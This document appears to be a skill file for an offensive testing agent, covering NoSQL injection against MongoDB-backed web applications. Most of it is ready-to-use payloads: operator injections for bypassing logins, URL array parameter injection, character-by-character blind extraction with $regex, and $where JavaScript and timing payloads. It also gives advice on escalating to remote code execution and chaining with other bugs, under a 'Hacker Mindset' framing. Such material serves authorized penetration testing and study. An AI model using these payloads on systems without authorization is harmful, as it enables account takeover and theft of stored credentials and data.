---

name: web-02-nosql-injection
sequence: web-02
category: injection
domain: web
description: "NoSQL injection testing skill: MongoDB operator injection ($ne, $gt, $regex, $where), blind NoSQL via timing/boolean, JSON body injection, query parameter array injection, and Node.js prototype chain abuse. Use when testing applications using MongoDB, Couchbase, or other NoSQL databases."
wordlist_ref: "wordlists/web/web-45-nosql-injection/"
---

# NoSQL Injection — Offensive Testing Methodology

## Quick Workflow

1. Identify endpoints accepting JSON bodies or query parameters that reach NoSQL databases (MongoDB, Couchbase, Firebase, etc.)
2. Inject operator payloads (`$ne`, `$gt`, `$regex`) in place of expected values — if auth/access bypasses, NoSQLi confirmed
3. Escalate with `$where` for JavaScript injection, blind extraction via `$regex` character-by-character
4. Chain with prototype pollution if Node.js backend

---

## Detection

### Authentication Bypass Probes

```json
// Instead of: {"username":"admin","password":"secret"}
// Try:
{"username":{"$ne":""},"password":{"$ne":""}}
{"username":{"$gt":""},"password":{"$gt":""}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
{"$or":[{"admin":true}]}
{"admin":true,"role":"admin"}
```

### URL Parameter Injection

```
username[$ne]=invalid&password[$ne]=invalid
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
username[$exists]=true&password[$exists]=true
```

### Blind NoSQL Extraction

Use `$regex` for character-by-character blind extraction (like SQL blind):

```
username[$regex]=^a&password[$ne]=x   → true → first char is 'a'
username[$regex]=^b&password[$ne]=x   → false
```

### Time-Based Blind

```json
{"$where":"sleep(5000)"}
{"$where":"d=new Date;do{n=new Date;}while(n-d<5000);1"}
```

---

## Bypass Techniques

| Technique | Payload |
|-----------|---------|
| Null check bypass | `{"$ne":null}` |
| Greater-than bypass | `{"$gt":""}` |
| Regex match all | `{"$regex":".*"}` |
| JavaScript eval | `{"$where":"this.password.length>0"}` |
| OR bypass | `{"$or":[{"admin":true}]}` |
| Array injection | `username[$ne]=invalid&password[$ne]=invalid` |
| URL-encoded | `%7b%22%24ne%22%3anull%7d` |

---

## Tools

- **Burp Intruder** with NoSQL operator payload set
- **NoSQLMap** — automated NoSQL injection tool
- **Custom scripts** — Python with requests library

---

### Advanced MongoDB Operators

```json
// $in — test multiple users at once
{"username":{"$in":["admin","administrator","root"]},"password":{"$gt":""}}

// $and / $or — complex boolean logic
{"$or":[{"username":"admin"},{"username":"administrator"}],"password":{"$gt":""}}
{"$and":[{"username":{"$ne":null}},{"password":{"$ne":null}}]}

// $exists — test field presence
{"username":{"$gt":""},"password":{"$exists":true}}

// $options — case-insensitive regex
{"username":"admin","password":{"$regex":"^a","$options":"i"}}
```

### $where JavaScript Injection

```json
// Boolean context bypass
{"$where":"this.username=='admin'"}
{"$where":"1==1"}
{"$where":"function(){return true}"}

// Time-based blind
{"$where":"sleep(5000)"}
{"$where":"d=new Date;do{n=new Date;}while(n-d<5000);1"}

// Gated (server-side) function execution
{"$where":"function(){return this.username != null}"}
{"$where":"function(){return /admin/.test(this.role)}"}
{"$where":"function(){return Date.now()>0}"}
```

### Encoding & Structured Body Bypass

```json
// URL-encoded array parameters
username%5B%24ne%5D=null&password%5B%24ne%5D=null

// URL-encoded operators
{$ne:null}
{$gt:""}
{$regex:".*"}
{$exists:true}
```

### NoSQL-Specific Bypass Table

| Input Type | Probe | Expected Result |
|-----------|-------|-----------------|
| Auth body | `{"username":{"$gt":""},"password":{"$gt":""}}` | Bypass if no type checking |
| Auth body | `{"$or":[{"admin":true}]}` | Bypass via OR injection |
| URL param | `username[$ne]=invalid&password[$ne]=invalid` | Bypass via array syntax |
| JSON body | `{"$where":"sleep(5000)"}` | Time delay confirms injection |
| Blind ext | `{"username":{"$regex":"^a.*"}}` | True/false response difference |





## Hacker Mindset

**NoSQL injection bypasses auth better than SQLi.** You don't need to understand the query structure — just inject `{"$ne":""}` and the auth check collapses.

**Blind NoSQL extraction is faster than SQL blind** because `$regex` gives you character-by-character match without time delays.

**MongoDB `$where` is JavaScript evaluation.** If you find a `$where` injection, you're one step from server-side JS execution.



## Chaining & Escalation

### Direct Escalation
This vulnerability can often be escalated directly. Test for RCE, data access, or privilege escalation depending on context.

### Chain with Other Skills
| Partner Vulnerability | Chain Effect |
|----------------------|--------------|
| SSRF | Use SSRF to reach internal services through this vuln |
| XSS | Stolen sessions amplify account-level findings |
| IDOR/BOLA | Find more data to exploit via authorization gaps |

### Amplification
Race conditions, parallel requests, and HTTP/2 single-packet attacks can amplify impact by 10-50x.



## OOB Detection & Blind Confirmation

### Blind Confirmation
Always set up OOB detection before testing. Use:
- **Burp Collaborator** — built into Burp Suite Pro
- **Interactsh** — OOB detection server (https://app.interactsh.com)
- **Canarytokens** for callback detection

### Timing Side-Channel
If OOB is blocked, use time-based detection:
- Inject `sleep(5)` or equivalent
- Compare response times between baseline and injected requests
- 5s+ delay = vulnerability confirmed

## Wordlist Invocation

When testing this vulnerability, invoke the wordlist payloads manually:

**Wordlist**: `wordlists/web/web-45-nosql-injection/`

**Files**:
- `wordlists/web/web-45-nosql-injection/payloads/nosql/` — staged exploit payloads (low → med → high)

**Workflow**:
1. Start with `low` stage payloads — minimal risk probes
2. If signals detected, escalate to `med` stage
3. Use `high` only after confirmation (OOB/time-based where applicable)
4. Always establish a baseline response before running time-based payloads

**Tools**: curl, httpx, Burp Suite, or any HTTP client

## References

- MongoDB $where operator: https://www.mongodb.com/docs/manual/reference/operator/query/where/
- OWASP NoSQL Injection
